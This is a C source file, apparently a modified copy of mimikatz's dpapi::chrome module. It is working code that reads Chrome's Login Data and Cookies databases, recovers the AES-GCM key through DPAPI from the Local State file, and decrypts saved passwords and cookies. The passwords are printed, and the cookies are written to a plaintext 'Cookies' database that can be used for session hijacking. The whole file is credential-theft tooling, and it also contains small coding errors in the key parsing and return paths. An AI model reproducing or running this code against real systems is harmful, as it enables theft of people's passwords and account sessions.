/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_chrome.h"

NTSTATUS kuhl_m_dpapi_chrome(int argc, wchar_t * argv[])
{
	LPCWSTR infile, szKey;
	PSTR aInfile;
	int rc;    // handle to original file
	int rc2;   // handle of destination file
	sqlite3 *pDb;    // original Cookies database
	sqlite3 *db;     // copy of Cookies database
	sqlite3_stmt * pStmt;    // step through file
	char *err_msg = 0;       // to handle errors
	char *sql;               // to create SQL statements
	
	__int64 i64;
	BYTE key[AES_256_KEY_SIZE];
	BCRYPT_ALG_HANDLE hAlg = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"key", &szKey, NULL))
		{
			if(kull_m_string_stringToHex(szKey, key, sizeof(key)))
				kuhl_m_dpapi_chrome_alg_key_from_raw(key, &hAlg, &hKey);
			else PRINT_ERROR(L"kull_m_string_stringToHex!\n");
		}
		else if(kull_m_string_args_byName(argc, argv, L"encryptedkey", &szKey, NULL))
			kuhl_m_dpapi_chrome_alg_key_from_b64(szKey, argc, argv, &hAlg, &hKey);
		else if(kull_m_string_args_byName(argc, argv, L"state", &szKey, NULL))
			kuhl_m_dpapi_chrome_alg_key_from_file(szKey, TRUE, argc, argv, &hAlg, &hKey);
		else kuhl_m_dpapi_chrome_alg_key_from_auto(infile, argc, argv, &hAlg, &hKey);

		if(aInfile = kull_m_string_unicode_to_ansi(infile))
		{
			rc = sqlite3_initialize();
			if(rc == SQLITE_OK)
			{
				rc = sqlite3_open_v2(aInfile, &pDb, SQLITE_OPEN_READONLY, "win32-none");
				if(rc == SQLITE_OK)
				{
					if(kuhl_m_dpapi_chrome_isTableExist(pDb, "logins"))
					{
						rc = sqlite3_prepare_v2(pDb, "select signon_realm, origin_url, username_value, password_value from logins", -1, &pStmt, NULL);
						if(rc == SQLITE_OK)
						{
							while(rc = sqlite3_step(pStmt), rc == SQLITE_ROW)
							{
								kprintf(L"\nURL     : %.*S ( %.*S )\nUsername: %.*S\n",
									sqlite3_column_bytes(pStmt, 0), sqlite3_column_text(pStmt, 0),
									sqlite3_column_bytes(pStmt, 1), sqlite3_column_text(pStmt, 1),
									sqlite3_column_bytes(pStmt, 2), sqlite3_column_text(pStmt, 2));
								kuhl_m_dpapi_chrome_decrypt(sqlite3_column_blob(pStmt, 3), sqlite3_column_bytes(pStmt, 3), hAlg, hKey, argc, argv, L"Password");
							}
							if(rc != SQLITE_DONE)
								PRINT_ERROR(L"sqlite3_step: %S\n", sqlite3_errmsg(pDb));
						}
						else PRINT_ERROR(L"sqlite3_prepare_v2: %S\n", sqlite3_errmsg(pDb));
						sqlite3_finalize(pStmt);
					}
					else if(kuhl_m_dpapi_chrome_isTableExist(pDb, "cookies"))
					{
						

						/**** cookies table ****/

						// read original table from Chrome file
						rc = sqlite3_prepare_v2(pDb, "select * from cookies", -1, &pStmt, NULL);

						// open destination file
						rc2 = sqlite3_open("Cookies", &db); 
						// create cookies and meta tables in dest. file
						sql = "CREATE TABLE cookies(creation_utc INTEGER NOT NULL,host_key TEXT NOT NULL,name TEXT NOT NULL,value TEXT NOT NULL,path TEXT NOT NULL,expires_utc INTEGER NOT NULL,is_secure INTEGER NOT NULL,is_httponly INTEGER NOT NULL,last_access_utc INTEGER NOT NULL,has_expires INTEGER NOT NULL DEFAULT 1,is_persistent INTEGER NOT NULL DEFAULT 1,priority INTEGER NOT NULL DEFAULT 1,encrypted_value BLOB DEFAULT '',samesite INTEGER NOT NULL DEFAULT -1,source_scheme INTEGER NOT NULL DEFAULT 0,UNIQUE (host_key, name, path));"
							"CREATE TABLE meta(key LONGVARCHAR NOT NULL UNIQUE PRIMARY KEY, value LONGVARCHAR);";
						sqlite3_exec(db, sql, 0, 0, &err_msg);

						// step through orig. file and copy cookies columns to dest. file
						if (rc == SQLITE_OK)
						{
							while (rc = sqlite3_step(pStmt), rc == SQLITE_ROW)
							{
								// decrypt encrypted blob
								PUCHAR deckey = kuhl_m_dpapi_chrome_decrypt2(sqlite3_column_blob(pStmt, 12), sqlite3_column_bytes(pStmt, 12), hAlg, hKey, argc, argv, L"Cookie");

								sql = sqlite3_mprintf("INSERT INTO cookies VALUES('%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q', '%q');",
									sqlite3_column_text(pStmt, 0),
									sqlite3_column_text(pStmt, 1),
									sqlite3_column_text(pStmt, 2),
									//sqlite3_column_text(pStmt, 3),
									deckey, // save decrypted blob in "value" column
									sqlite3_column_text(pStmt, 4),
									sqlite3_column_text(pStmt, 5),
									sqlite3_column_text(pStmt, 6),
									sqlite3_column_text(pStmt, 7),
									sqlite3_column_text(pStmt, 8),
									sqlite3_column_text(pStmt, 9),
									sqlite3_column_text(pStmt, 10),
									sqlite3_column_text(pStmt, 11),
									//deckey,
									"",	    //replace encrypted_value column with empty line
									sqlite3_column_text(pStmt, 13),
									sqlite3_column_text(pStmt, 14)
									);
								sqlite3_exec(db, sql, 0, 0, &err_msg);								
							}
							if (rc != SQLITE_DONE)
								PRINT_ERROR(L"sqlite3_step: %S\n", sqlite3_errmsg(pDb));
						}



						/**** meta table ****/

						// read original table from Chrome file
						rc = sqlite3_prepare_v2(pDb, "select * from meta", -1, &pStmt, NULL);

						// step through orig. file and copy meta columns to dest. file
						if (rc == SQLITE_OK)
						{
							while (rc = sqlite3_step(pStmt), rc == SQLITE_ROW)
							{
								sql = sqlite3_mprintf("INSERT INTO meta VALUES('%q', '%q');", sqlite3_column_text(pStmt, 0), sqlite3_column_text(pStmt, 1));
								sqlite3_exec(db, sql, 0, 0, &err_msg);
							}

							if (rc != SQLITE_DONE)
								PRINT_ERROR(L"sqlite3_step: %S\n", sqlite3_errmsg(pDb));
						}
						else PRINT_ERROR(L"sqlite3_prepare_v2: %S\n", sqlite3_errmsg(pDb));
						sqlite3_finalize(pStmt);
					}
					else PRINT_ERROR(L"Neither the table \'logins\' or the table \'cookies\' exist!\n");
				}
				else PRINT_ERROR(L"sqlite3_open_v2: %S (%S)\n", sqlite3_errmsg(pDb), aInfile);
				rc = sqlite3_close_v2(pDb);
				rc = sqlite3_close_v2(db);
				rc = sqlite3_shutdown();
			}
			else PRINT_ERROR(L"sqlite3_initialize: 0x%08x\n", rc);
			LocalFree(aInfile);
		}
		kuhl_m_dpapi_chrome_free_alg_key(&hAlg, &hKey);
	}
	else PRINT_ERROR(L"Input \'Login Data\' file needed (/in:\"%%localappdata%%\\Google\\Chrome\\User Data\\Default\\Login Data\")\n");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_dpapi_chrome_isTableExist(sqlite3 *pDb, const char *table)
{
	BOOL status = FALSE;
	sqlite3_stmt * pStmt;
	int rc;
	rc = sqlite3_prepare_v2(pDb, "select count(*) from sqlite_master where type=\'table\' and name=?", -1, &pStmt, NULL);
	if(rc == SQLITE_OK)
	{
		rc = sqlite3_bind_text(pStmt, 1, table, -1, SQLITE_STATIC);
		if(rc == SQLITE_OK)
		{
			rc = sqlite3_step(pStmt);
			if(rc == SQLITE_ROW)
				status = sqlite3_column_int(pStmt, 0) > 0;
			else PRINT_ERROR(L"sqlite3_step: %S\n", sqlite3_errmsg(pDb));
		}
		else PRINT_ERROR(L"sqlite3_bind_text: %S\n", sqlite3_errmsg(pDb));
	}
	else PRINT_ERROR(L"sqlite3_prepare_v2: %S\n", sqlite3_errmsg(pDb));
	sqlite3_finalize(pStmt);
	return status;
}

const BYTE KUHL_M_DPAPI_CHROME_UNKV10[] = {'v', '1', '0'};
void kuhl_m_dpapi_chrome_decrypt(LPCVOID pData, DWORD dwData, BCRYPT_ALG_HANDLE hAlg, BCRYPT_KEY_HANDLE hKey, int argc, wchar_t * argv[], LPCWSTR type)
{
	LPVOID pDataOut;
	DWORD dwDataOutLen;
	NTSTATUS nStatus;
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
	if((dwData >= sizeof(KUHL_M_DPAPI_CHROME_UNKV10)) && RtlEqualMemory(pData, KUHL_M_DPAPI_CHROME_UNKV10, sizeof(KUHL_M_DPAPI_CHROME_UNKV10)))
	{
		if(hAlg && hKey)
		{
			kprintf(L" * using BCrypt with AES-256-GCM\n");
			BCRYPT_INIT_AUTH_MODE_INFO(info);
			info.pbNonce = (PBYTE) pData + sizeof(KUHL_M_DPAPI_CHROME_UNKV10);
			info.cbNonce = 12;
			info.pbTag = info.pbNonce + dwData - (sizeof(KUHL_M_DPAPI_CHROME_UNKV10) + AES_BLOCK_SIZE); //
			info.cbTag = AES_BLOCK_SIZE; //
			dwDataOutLen = dwData - sizeof(KUHL_M_DPAPI_CHROME_UNKV10) - info.cbNonce - info.cbTag;
			if(pDataOut = LocalAlloc(LPTR, dwDataOutLen))
			{
				nStatus = BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, &info, NULL, 0, (PUCHAR) pDataOut, dwDataOutLen, &dwDataOutLen, 0);
				if(NT_SUCCESS(nStatus))
					kprintf(L"%s: %.*S\n", type, dwDataOutLen, pDataOut);
				else PRINT_ERROR(L"BCryptDecrypt: 0x%08x\n", nStatus);
				LocalFree(pDataOut);
			}
		}
	}
	else if(kuhl_m_dpapi_unprotect_raw_or_blob(pData, dwData, NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
	{
		kprintf(L"%s: %.*S\n", type, dwDataOutLen, pDataOut);
		LocalFree(pDataOut);
	}
}




PUCHAR kuhl_m_dpapi_chrome_decrypt2(LPCVOID pData, DWORD dwData, BCRYPT_ALG_HANDLE hAlg, BCRYPT_KEY_HANDLE hKey, int argc, wchar_t * argv[], LPCWSTR type)
{
	LPVOID pDataOut;
	DWORD dwDataOutLen;
	NTSTATUS nStatus;
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
	if ((dwData >= sizeof(KUHL_M_DPAPI_CHROME_UNKV10)) && RtlEqualMemory(pData, KUHL_M_DPAPI_CHROME_UNKV10, sizeof(KUHL_M_DPAPI_CHROME_UNKV10)))
	{
		if (hAlg && hKey)
		{
			BCRYPT_INIT_AUTH_MODE_INFO(info);
			info.pbNonce = (PBYTE)pData + sizeof(KUHL_M_DPAPI_CHROME_UNKV10);
			info.cbNonce = 12;
			info.pbTag = info.pbNonce + dwData - (sizeof(KUHL_M_DPAPI_CHROME_UNKV10) + AES_BLOCK_SIZE); //
			info.cbTag = AES_BLOCK_SIZE; //
			dwDataOutLen = dwData - sizeof(KUHL_M_DPAPI_CHROME_UNKV10) - info.cbNonce - info.cbTag;
			if (pDataOut = LocalAlloc(LPTR, dwDataOutLen))
			{
				nStatus = BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, &info, NULL, 0, (PUCHAR)pDataOut, dwDataOutLen, &dwDataOutLen, 0);
				if (NT_SUCCESS(nStatus))
					return pDataOut;
				else PRINT_ERROR(L"Error");
				LocalFree(pDataOut);
			}
		}
		else PRINT_ERROR(L"Error\n");
	}
	else if (kuhl_m_dpapi_unprotect_raw_or_blob(pData, dwData, NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
	{
		return pDataOut;
		LocalFree(pDataOut);
	}
}





void kuhl_m_dpapi_chrome_free_alg_key(BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey)
{
	if(hAlg)
		if(*hAlg)
		{
			BCryptCloseAlgorithmProvider(*hAlg, 0);
			*hAlg = NULL;
		}
	if(hKey)
		if(*hKey)
		{
			BCryptDestroyKey(*hKey);
			*hKey = NULL;
		}
}

BOOL kuhl_m_dpapi_chrome_alg_key_from_raw(BYTE key[AES_256_KEY_SIZE], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey)
{
	BOOL status = FALSE;
	NTSTATUS nStatus;
	*hAlg = NULL;
	*hKey = NULL;

	__try
	{
		nStatus = BCryptOpenAlgorithmProvider(hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
		if(NT_SUCCESS(nStatus))
		{
			nStatus = BCryptSetProperty(*hAlg, BCRYPT_CHAINING_MODE, (PUCHAR) BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
			if(NT_SUCCESS(nStatus))
			{
				nStatus = BCryptGenerateSymmetricKey(*hAlg, hKey, NULL, 0, key, AES_256_KEY_SIZE, 0);
				if(NT_SUCCESS(nStatus))
					status = TRUE;
				else PRINT_ERROR(L"BCryptGenerateSymmetricKey: 0x%08x\n", nStatus);
			}
			else PRINT_ERROR(L"BCryptSetProperty: 0x%08x\n", nStatus);
			if(!status)
				kuhl_m_dpapi_chrome_free_alg_key(hAlg, hKey);
		}
		else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", nStatus);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
	{
		PRINT_ERROR(L"No CNG\n");
	}

	return status;
}

const BYTE KUHL_M_DPAPI_CHROME_DPAPI[] = {'D', 'P', 'A', 'P', 'I'};
BOOL kuhl_m_dpapi_chrome_alg_key_from_b64(LPCWSTR base64, int argc, wchar_t * argv[], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey)
{
	BOOL status = FALSE;
	PBYTE keyWithHeader, rawKey;
	DWORD dwKeyWithHeader, dwRawKey;

	if(kull_m_string_quick_base64_to_Binary(base64, &keyWithHeader, &dwKeyWithHeader))
	{
		if((dwKeyWithHeader >= sizeof(KUHL_M_DPAPI_CHROME_DPAPI)) && RtlEqualMemory(keyWithHeader, KUHL_M_DPAPI_CHROME_DPAPI, sizeof(KUHL_M_DPAPI_CHROME_DPAPI)))
		{
			if(kuhl_m_dpapi_unprotect_raw_or_blob(keyWithHeader + sizeof(KUHL_M_DPAPI_CHROME_DPAPI), dwKeyWithHeader - sizeof(KUHL_M_DPAPI_CHROME_DPAPI), NULL, argc, argv, NULL, 0, (LPVOID *) &rawKey, &dwRawKey, NULL))
			{
				if(dwRawKey == AES_256_KEY_SIZE)
				{
					status = kuhl_m_dpapi_chrome_alg_key_from_raw(rawKey, hAlg, hKey);
				}
				LocalFree(rawKey);
			}
		}
		LocalFree(keyWithHeader);
	}
	return status;
}

BOOL kuhl_m_dpapi_chrome_alg_key_from_file(LPCWSTR szState, BOOL forced, int argc, wchar_t * argv[], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey)
{
	BOOL status = FALSE;
	PBYTE data;
	DWORD dwData;
	wchar_t *uData, *begin, *end;
	if(kull_m_file_readData(szState, &data, &dwData))
	{
		if(uData = kull_m_string_qad_ansi_c_to_unicode((const char *) data, dwData))
		{
			if(begin = wcsstr(uData, L"\"os_crypt\":{\"encrypted_key\":\""))
			{
				begin += 29;
				if(end = wcsstr(begin, L"\"}"))
				{
					end = L'\0';
					status = kuhl_m_dpapi_chrome_alg_key_from_b64(begin, argc, argv, hAlg, hKey);
				}
			}
			else if(forced) PRINT_ERROR(L"encrypted_key not fond in state file.\n");
			LocalFree(uData);
		}
		LocalFree(data);
	}
	else if(forced) PRINT_ERROR_AUTO(L"kull_m_file_readData");
	return status;
}

BOOL kuhl_m_dpapi_chrome_alg_key_from_auto(LPCWSTR szFile, int argc, wchar_t * argv[], BCRYPT_ALG_HANDLE *hAlg, BCRYPT_KEY_HANDLE *hKey)
{
	BOOL status = FALSE;
	wchar_t *duplicate, *pe, *tentative;
	if(szFile && (duplicate = _wcsdup(szFile)))
	{
		if(pe = wcsrchr(duplicate, L'\\'))
		{
			*pe = L'\0';
			if(pe = wcsrchr(duplicate, L'\\'))
			{
				*pe = L'\0';
				if(kull_m_string_sprintf(&tentative, L"%s\\Local State", duplicate))
				{
					status = kuhl_m_dpapi_chrome_alg_key_from_file(tentative, FALSE, argc, argv, hAlg, hKey);
					LocalFree(tentative);
				}
			}
		}
		free(duplicate);
	}
	return status;
}